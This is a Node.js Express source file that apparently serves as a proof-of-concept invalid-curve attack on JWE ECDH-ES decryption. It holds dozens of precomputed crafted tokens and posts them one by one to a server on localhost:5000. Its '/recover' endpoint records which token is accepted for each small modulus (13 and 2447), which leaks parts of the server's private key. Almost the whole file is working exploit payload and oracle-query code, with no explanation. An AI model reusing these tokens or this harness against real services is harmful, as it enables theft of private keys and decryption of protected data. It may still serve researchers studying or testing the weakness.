var express = require("express");
var qs = require("qs");
var bodyParser = require('body-parser');
var querystring = require('querystring');
var request = require("sync-request");
var jose = require('node-jose');
var nosql = require('nosql').load('database.nosql');
var app = express();
var cons = require('consolidate');
var __ = require('underscore');
__.string = require('underscore.string');

app.set('port', (process.env.PORT || 5001));
app.engine('html', cons.underscore);
app.set('view engine', 'html');
app.set('views', 'files');

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));


var JWE = jose.JWE;
var JWK = jose.JWK;

var token_mod_13 = ["a", "eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiZ1RsaTY1ZVRRN3otQmgxNDdmZjhLM203azJVaURpRzJMcFlrV0FhRkpDYyIsInkiOiJjTEFuakthNGJ6akQ3REpWUHdhOUVQclJ6TUc3ck9OZ3NpVUQta2YzMEZzIiwiY3J2IjoiUC0yNTYifX0.qGAdxtEnrV_3zbIxU2ZKrMWcejNltjA_dtefBFnRh9A2z9cNIqYRWg.pEA5kX304PMCOmFSKX_cEg.a9fwUrx2JXi1OnWEMOmZhXd94-bEGCH9xxRwqcGuG2AMo-AwHoljdsH5C_kcTqlXS5p51OB1tvgQcMwB5rpTxg.72CHiYFecyDvuUa43KKT6w","c"];
var token_mod_2447 = ["eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.ELvYp_F-Oyt-Q9JLBfcVu4n4qFUria-nijvR5VhEYLgohXpTRyoYOQ.ljXz5HQjxmtuEZnG0BRrQQ.xHz4tvaqt-fP0-nbJ8QvU_vaKIQfzRajgusdeK1hSZnJfOSd2JglRYBTURDUH3hblTYZJNxcDB4L8Z_BqFKkkQ.UacX-SZBOV7IE-CidNEMaw","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.xbOQ4BE4K9cZsUPE81gAlFAmNPaHZoP-sL-FWZYk41iE8oNEsfYShg.ljXz5HQjxmtuEZnG0BRrQQ.Pr_nFbWfB-zNvhfk7UtzPuqVVTsZqN5vRfJfhHCRsZUuufRdDk6tz87Azwjr4D8tRYidsHoBQAkuCroL1Hbhig.zXgXgCSrppp8Pfivp47QLA","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.I4UBHuglOm7UB1JjIKLDd0tN4Keo2R3rE4kH0MGoqQQfaYJ9jxp0XA.ljXz5HQjxmtuEZnG0BRrQQ.FR5BK7ZJZcLvM5haOX5S5eNvM5F5MoEHy2gni5s9eRVOtyqpDug8AF40R4j7t_dATJZkIzhAjfJ-0rltJoqAWg.YNmuLpJZw1WZqXkug2K_BQ","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.1pRs0qLxPy7q0d9uzoAywAlcJRdYNAolqQ8ePqy38uX9UuGCfgFAxg.ljXz5HQjxmtuEZnG0BRrQQ.766qy4p2q_XnXl10azIG1Gi0JeSAad54G2Fd_fF98tYzB6IV5hB77KU_DPQpVBrjVaFQJHucTjp5B7OI_NPLOQ.QCQvVm34JLv58-KvLpzRdw","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.qkQc-15M78UctEuc2luPAfn6RLbacjOik60vH7DIu-GEV7SM61Ynvg.ljXz5HQjxmtuEZnG0BRrQQ.PhH-q9VZkh8cfzHYhpeR1EFHqvvAE0ejVf8rQccGKUFlQBGm29p-H8QYvvNa2h5ratlgom5UOsVh_gCizANOOw.SILO854nLOySjgfOZ7R53w","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.uB86MiUE5wSv4pqYzl_BbF076CqdKkcWuYl2rA_HMSanzzzX6FY7BQ.ljXz5HQjxmtuEZnG0BRrQQ.8G0kiRDqGG9gkl-3z6424Ws-RjHq6_Nji04zeK_Eyb4guvJcjg-yDEFvOWCpp-DdKYaVFHNpB8LTdc1Yu9iV1Q.y_ZfyjbnF_VJUf83Rfa4lg","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.Yx2hE32LQPI_e2kgcLkR14g7Pd5IFvOV8WlQwvCz5CdAa_u5CFODOw.ljXz5HQjxmtuEZnG0BRrQQ.2bdKOfvqz3bd1bPrHLFFbnN33LHakbAXbw4ZrdtQef66F_VZdSMahUwASACrU7MGMPhWHI2-xaJbZ2XWv3aeLg.LjskCyHnUgVMo5nCRpabfA","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.OzSrIbV0Suiag79viyRhIae2H8O0XELqHWkwT3x5Wa0BqcHzT27aZw.ljXz5HQjxmtuEZnG0BRrQQ.CYStLScG4xpqpLbeg7muHeKYT_s_ZaTx3Kq1GADoOr0ZX0sJehY9UvRm_J4zRdsKqgc6MV3N_IRHZFaD921NIA.jNx_TbfgsDYwQUJ4I4yI5g","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.mJRHWJPo4G4CZWFfgMh_wUESaxM6GrZ5IQmZ0Gec9X6Xx21gBDJznw.ljXz5HQjxmtuEZnG0BRrQQ.alE9W41ieU91zPuCjnnY8Dt-93uvtrECvE7tpkAFewmZVWsqmMV2H-82Ggmj2xNC3pWYLUE1jS7Qmj8_5vAyWQ.9qw-41HYOUdUCwwbngCxzg","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.XU3coQ64pOA4YQUsgJj1ndAEHUNqe3CkNcMVaQ9JIcuJWq13gTgRiA.ljXz5HQjxmtuEZnG0BRrQQ.vaWT6OUNPSG7QLGLTvbhkVyxDhrRtR-g6WdT7txAQH75ruhx-3B_A63nCmxYwoIsUL4CVhNZcpD6UQ7WN_JWow.CCrUWFfepkh0DhI6u2Fb7w","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.PTcEAZz7JcXpmQF3nqbHZkJ92ozF6oKTJdBQKPvH_5plWmA5dD51jQ.ljXz5HQjxmtuEZnG0BRrQQ.HvDZxvdmW8_1lkOXzogdBLiJVhf9CIBZLLSILaPh5Zh0xH9NGcFyNFyNy_KXsAmHSO1YqifUj6armubGb_Bd4Q.4of9SZPOf2aExvpJIsDX6w","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.SlC-WrPbYfkrZGkevyFtiv5YdwpiJgrn5LrsW6z0uE-YyukTtWHjwA.ljXz5HQjxmtuEZnG0BRrQQ.MrNrZ6MWhBV_HfjDIVW5CE21tAvL0gh8Og06KSClvwXpxCZRPMksPsYrDd-JBHzwzbVRUSAYHD_41WelyvqRvg.9L46E3nESn_-BZfEi6JpPw","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.bboaNy0stA3vYE0VdDXwtQPzuzTw6XhWoBVGt7lQWhZacltA2LwvVQ.ljXz5HQjxmtuEZnG0BRrQQ._pRC8QV3LFaA2xqGUIZX5-UV6aOhDGlhjkED6XkdSnDBTrmOIK9L-pRC0YYt2QHm0Xzk12xzg6OzbJOsAw3UqQ.JeHGgYVaVWNMUDMfdJVLpg","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.AYToDUaSNQp2K4EBkiupdRqepa9suhVZXxteZgRfgT-8Tk8xfp--_A.ljXz5HQjxmtuEZnG0BRrQQ.3cqmoYBrG4ztrQ75MTWCNumNmTgZSbHhMHkWObRmBKasXUulbJhhvD7HuQ0cNQwYb219pr2YL3TJPEAd1TiuyA.veJ3qkXX8oiR_rVHxqT4sw","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.ewxpTEOXyjBcIDF4eDEm4lcu1yz5bI-W3Gu_LOeifq6cLA3UHcHFFg.ljXz5HQjxmtuEZnG0BRrQQ.64LgFxNgPbDBifj3KXrVlkCDKpc2uwmjeqdYy-RTD0bV7NN9VB1WopfjERL7MAgLN2y5mceZ3oPg9XRYs_Jl3w.pN18TTcUWFS2YTU5XBy-5w","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.7AISTJFB3M4hU4EfzcfdMiV868lW8iHXJAWNxWtDEcwUAL0jRoMMTA.ljXz5HQjxmtuEZnG0BRrQQ.JVeXreQQUZuIcJSTfn-190IQezVJQWoKCYeqdh9k2TgUKfl9TTmBjMaqJxe0-WLMoluX0M56Sqs8YA1L2-YPcA.N3tL4xH28KRw4va49_ausg","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.K2BQ21b_FpfP9k3nuNA2jlNbCjyIawCVMrKECKE2GCGi1HLmAKn6_g.ljXz5HQjxmtuEZnG0BRrQQ.xGuEBYISSxwK5La6tdba3gQdrMhzzaHS6uiKYPeX4wTPtWifpVCN_oiKfCYfalKp79pLy9PI_54XLe-_x_m3dw.sHC46oo8sTtEulc-q32OHA","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.pZ-FYygJ4SIusBPWVNLvOBcTbV3iM-IUZW4i8kj3m2FWmUXzKhPy7A.ljXz5HQjxmtuEZnG0BRrQQ.UmbLdvH5zKLGmoeQKVO4FGCEuj5nLd9TEiymqIpXjc2gBpNpSGlYC6osJODOiiKjyunirVUxF79NOA-oetjmQw.2IQwqQwLExkiOC6F9vdYvg","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.xg3fMPbcyU2NP-GxGGbTzlDv7DPdclDvikn4GEZOfeZvlstyl-VUJg.ljXz5HQjxmtuEZnG0BRrQQ.kSSG472wCIrdWRstpsk0zH45sbeBM8mDv3BnOAqUWXMbcUYg_FEmHIECYA9t5P5dRIwDJ-HG3IKgH3P_LevghQ.gSOjseYs3vok5WNIme6Eog","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.pXYj0GrnQ1kUoy7_CjX70dXfvRvvgfQz3fUC89K_aTqAxUKBAB71og.ljXz5HQjxmtuEZnG0BRrQQ.l0KwWDS7EUO4h98DccQ4won2QCIs0PYMcTrifkfdnKWIhRJkQUhiJ5WxiO2Cdb48yDohEXUSR4QweiMkmkTv9w.hJu6Kr-cgt9ge--C15Gy2g","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.OBbN7y5bXJDNz7b76HDV4ZQrbJBaY9uerN_keR691YIInsySN21PGw.ljXz5HQjxmtuEZnG0BRrQQ.Ee0GWeX021L9JknRhnHUmUZlT7bz9IjYBdwBAgPwwUAStsYEuOsgDzz8f_xjBsIziKBxlGupbwuz4SYhx4G-gQ.mIEfAnTh3Eoh82qGiHaciA","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.TKFdA5HJ9B731SjYcucQHGhQnNJJvVKeyDKyTElpyhjfNwg8PgGoVQ.ljXz5HQjxmtuEZnG0BRrQQ.N1FOAE0wZcYStkU29fjE0hc6V8Rg8_JAdXjDhDGLpB-GVNX-2Rjad3f78nKtq_twM10tnSKddl2aX4SuE7phDQ.Zt_NB-n953mpzWWrGdSieg","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.wW1U8VINgtl11pea-okyBBithuTs_qNA0A5o4rBHKwybJWKmuchovg.ljXz5HQjxmtuEZnG0BRrQQ.laXkEhrbJoZVHl5b_EeLJeBHaQMRrbiwd0o6VuQHS6UcM3H1bjCOnqN1GxdbE7u1jkCDUCNKqL_9GSzSwwxYNw.fmSzIFWw-guhqiEgqgCgxA","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.lhZI7wrP12x8c5TOsmtuhtCVLIPVW8qb0FbP3KlELdh__vPXYs3J_Q.ljXz5HQjxmtuEZnG0BRrQQ.D8ceRoNoBXFQd01ytJY-KUEvQ3QOOFI31mMPKH4Ah7s3owBFqSYfIlz8evTirtNtimpaB6z68IaE21oMJXCtWw.AD8zLiF3yex6yM8Spbeeow","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.rQLKNWzXa0U58Z61MftI3fm_M90BCZahYeP0u5gok7bBEbtJQwFNpg.ljXz5HQjxmtuEZnG0BRrQQ.i5mKOT9zvFzpgdQI-ZxRAdu7fLX8vBbQ_MA8DUORgFaRo9_ROPo8XXP1Kd6w071EdeCZJb3g6tih1WWXlBa6SA.sUSPGlE27hACl6SvrkDiJQ","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.engQ105yS0X02ugwjSCcn3Pdw_Opy12Wivc7P98VQ0mf8vy_eHatPg.ljXz5HQjxmtuEZnG0BRrQQ.Qjv2rTgwcyysrWKgrfqUvQ0LEsy6YlmUeNvzTEeadqOEIiBJjKddql4Ev3b-14eYw8wsd_37lHGj1bEgMmvNIg.tZoFGb6V1O0BQupbDHfuiQ","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.JIRrQnQW6BDvBkNMf_zZ5vps4gwXB36JF84_xth_gl4G5N9Jugv8hw.ljXz5HQjxmtuEZnG0BRrQQ.PL3rtVt9nOcJBaN-hf0wiMsvbSBEIG2Iwr3sdPG4OvU8rAZUVzPTbm-OlcyM2D0DnKoRotGq-7HFkYeSV8U3mw.hyl8KE9yhBBSGUx7HkBgfw","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.JdMpBO9W1g1jiLZ5rXi7p_GLehSGaV83z1VdwhAagoxnoNAh1gH7fw.ljXz5HQjxmtuEZnG0BRrQQ.4Bxtg7ZFP4vzhsX0JNWQPYKK2W8xaBLgc-2c4fjd_4jSm5F6V-KRIb_OTTphv80bqdMlLo3v-0Wq7sm3ilKA5A.Ky0iGW0WOonQfKPf5P45Dg","eyJhbGciOiJFQ0RILUVTK0ExMjhLVyIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJlcGsiOnsia3R5IjoiRUMiLCJ4IjoiWE9YR1E5XzZRQ3ZCZzN1OHZDSS1VZEJ2SUNBRWNOTkJyZnFkN3RHN29RNCIsInkiOiJoUW9XTm90bk56S2x3aUNuZUprTElxRG5UTnc3SXNkQkM1M1ZVcVZqVkpjIiwiY3J2IjoiUC0yNTYifX0.-lffV42rPARQIV67FyaDik2KZjls9EHJV8ttSAQY6SsfVyF--V9Pyw.ljXz5HQjxmtuEZnG0BRrQQ._8eX_JrXd668zyijhS6iyNrah9WECz2l1qDpo_569LINFVIr4pj4ClJd_9XfLhx2woX6lz2X8lRdjNF5m9u8xw.Kkr4qRXuFVy7EnBf8SvVjA",]


app.get("/", function(req, res){
  res.render('index');
});

function execute(modulo, tokens) {
  var requests = [];
  
  var validTokenIndex = tokens.findIndex(function (token) {
    var headers = {
      'Content-Type': 'application/x-www-form-urlencoded',
    };
    var body = qs.stringify({
      token: token
    });
    var r = {
      mod: modulo,
      headers: headers,
      body: body
    };
    var v = request('POST', "http://localhost:5000", r);
    r.statusCode = v.statusCode;
    requests.push(r);
    return v.statusCode === 200;
  });

  return {requests: requests, index: validTokenIndex};
}

app.post("/recover", function(req, res){

  var req13 = execute(13, token_mod_13);

  var req2447= execute(2447, token_mod_2447);

  res.render('result', {req13: req13.requests, req2447: req2447.requests});
});

var server = app.listen(app.get('port'), function() {
  var host = server.address().address;
  var port = port;
});
